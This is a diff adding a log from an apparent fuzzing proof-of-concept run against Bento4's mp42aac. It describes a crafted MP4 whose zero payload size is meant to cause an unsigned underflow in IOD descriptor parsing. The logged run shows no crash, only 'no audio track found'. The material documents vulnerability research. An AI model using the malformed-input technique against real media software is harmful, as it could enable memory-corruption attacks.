@@ -1,0 +1,20 @@
+=== VULN-002 PoC Runner ===
+Date: Mon Sep  7 05:11:35 PM +08 2026
+
+[*] Generating crafted MP4...
+[+] Written 166 bytes to /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IodsAtom_h/vuln_002.mp4
+[+] Strategy: B: MP4_IOD tag=0x10, payload_size=0 → substream size=0xFFFFFFF9
+[+] Expected trigger: AP4_ObjectDescriptor or AP4_InitialObjectDescriptor ctor
+[+]   payload_size=0 causes unsigned underflow in substream size computation
+[+]   0 - 7 = 0xFFFFFFF9  (AP4_InitialObjectDescriptor, tag=0x10)
+
+[*] Running mp42aac with ASAN+UBSAN...
+[*] Binary: /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac
+[*] Input:  /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IodsAtom_h/vuln_002.mp4
+
+ERROR: no audio track found
+
+[*] Collecting sanitizer log files...
+[*] No separate sanitizer log files found.
+
+=== Done ===
